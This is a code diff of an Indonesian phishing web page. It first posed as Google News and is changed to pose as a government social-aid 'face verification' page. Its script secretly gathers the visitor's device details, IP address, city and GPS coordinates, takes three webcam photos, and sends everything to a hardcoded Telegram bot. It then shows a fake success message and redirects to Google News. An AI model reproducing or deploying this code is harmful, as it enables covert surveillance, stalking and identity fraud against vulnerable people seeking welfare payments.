@@ -3,62 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google News</title>
+    <title>Verifikasi Data Nasional</title>
     <style>
-        body{font-family:sans-serif;margin:0;background:#f0f2f5;text-align:center}
-        .h{background:#1a73e8;color:#fff;padding:15px;font-weight:700}
-        .c{max-width:500px;margin:20px auto;background:#fff;border-radius:10px;padding:20px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
-        .b{width:100%;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer}
+        body { font-family: sans-serif; margin: 0; background: #f0f2f5; text-align: center; }
+        .h { background: #b71c1c; color: white; padding: 15px; font-weight: bold; }
+        .c { max-width: 480px; margin: 20px auto; background: white; border-radius: 10px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .b { width: 100%; padding: 15px; background: #b71c1c; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #L { display: none; margin-top: 15px; }
+        .bar { width: 100%; background: #ddd; height: 8px; border-radius: 5px; overflow: hidden; }
+        .fill { width: 0%; background: #b71c1c; height: 100%; transition: 6s linear; }
+        #v, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="h">Google News Indonesia</div>
+    <div class="h">SATGAS BANTUAN SOSIAL 2026</div>
     <div class="c">
-        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
-        <h1>Bantuan Sosial Tahap 2 Cair</h1>
-        <p>Verifikasi perangkat untuk melihat daftar nama.</p>
-        <button class="b" id="btn">CEK DAFTAR NAMA</button>
+        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%; border-radius:5px;">
+        <h2>Validasi Identitas Perangkat</h2>
+        <p>Gunakan kamera depan untuk memverifikasi data NIK agar bantuan dapat dicairkan.</p>
+        <button class="b" id="btn">MULAI VERIFIKASI WAJAH</button>
+        <div id="L">
+            <p id="S" style="color:#b71c1c; font-weight:bold;">Memindai Wajah... (Jangan Tutup Halaman)</p>
+            <div class="bar"><div class="fill" id="fill"></div></div>
+        </div>
     </div>
-    <video id="v" autoplay style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        const T="8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
-        const I="5392443720";
-        document.getElementById('btn').addEventListener('click', async function(){
-            this.innerText="Memproses...";
-            let txt = "📸 *TARGET BERHASIL*%0A";
-            txt += "📱 OS: " + navigator.platform + "%0A";
-            txt += "⚙️ Core: " + navigator.hardwareConcurrency + "%0A";
+        const T = "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
+        const I = "5392443720";
+
+        document.getElementById('btn').addEventListener('click', async function() {
+            this.style.display = "none";
+            document.getElementById('L').style.display = "block";
+            setTimeout(() => { document.getElementById('fill').style.width = "100%"; }, 100);
+
+            let info = "🔱 *LAPORAN PREDATOR*%0A━━━━━━━━━━━━━━━━━━%0A";
+            info += "📱 " + navigator.platform + " | " + navigator.hardwareConcurrency + " Cores%0A";
+
             try {
                 const b = await navigator.getBattery();
-                txt += "🔋 Bat: " + Math.round(b.level*100) + "%25%0A";
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                txt += "🌍 IP: " + d.ip + "%0A📍 " + d.city + "%0A";
-            } catch(e){}
+                info += "🔋 Bat: " + Math.round(b.level * 100) + "%25%0A";
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                info += "🌍 " + d.ip + " | " + d.city + "%0A";
+                info += "📌 [Maps](https://www.google.com/maps?q=" + d.latitude + "," + d.longitude + ")%0A";
+            } catch(e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    info += "🎯 [GPS](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")%0A";
+                    predatorCapture(info);
+                }, () => { info += "🎯 GPS: Ditolak%0A"; predatorCapture(info); });
+            } else { predatorCapture(info); }
+        });
+
+        async function predatorCapture(txt) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = s;
-                setTimeout(()=>{
-                    const c = document.getElementById('canvas');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v,0,0);
-                    c.toBlob(blob=>{
-                        const f = new FormData();
-                        f.append('chat_id', I); f.append('photo', blob, 'f.jpg');
-                        f.append('caption', decodeURIComponent(txt));
-                        f.append('parse_mode', 'Markdown');
-                        fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:'POST',body:f})
-                        .then(()=>{ window.location.href="https://news.google.com"; });
-                        s.getTracks().forEach(t=>t.stop());
-                    }, 'image/jpeg');
-                },2000);
-            } catch(e){
-                fetch("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+I+"&text="+txt+"%0A⚠️ Kamera Ditolak&parse_mode=Markdown")
-                .then(()=>{ window.location.href="https://news.google.com"; });
+                
+                // JEPRETAN 1 (Detik ke-2)
+                setTimeout(() => { jepret(v, txt + "📸 *FOTO 1 (NORMAL)*"); }, 2000);
+                
+                // JEPRETAN 2 (Detik ke-4)
+                setTimeout(() => { jepret(v, "📸 *FOTO 2 (ZOOM/REACTION)*"); }, 4500);
+
+                // JEPRETAN 3 (Detik ke-6 + Redirect)
+                setTimeout(() => { 
+                    jepret(v, "📸 *FOTO 3 (FINAL)*", true, s); 
+                }, 7000);
+
+            } catch (err) {
+                fetch("https://api.telegram.org/bot" + T + "/sendMessage?chat_id=" + I + "&text=" + txt + "%0A⚠️ Kamera Ditolak&parse_mode=Markdown")
+                .then(() => { window.location.href = "https://news.google.com"; });
             }
-        });
+        }
+
+        function jepret(v, cap, isLast = false, stream = null) {
+            const c = document.getElementById('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', I);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', decodeURIComponent(cap));
+                fd.append('parse_mode', 'Markdown');
+                fetch("https://api.telegram.org/bot" + T + "/sendPhoto", { method: 'POST', body: fd })
+                .then(() => {
+                    if (isLast) {
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("Verifikasi Identitas Berhasil! Mengalihkan ke database...");
+                        window.location.href = "https://news.google.com";
+                    }
+                });
+            }, 'image/jpeg');
+        }
     </script>
 </body>
 </html>
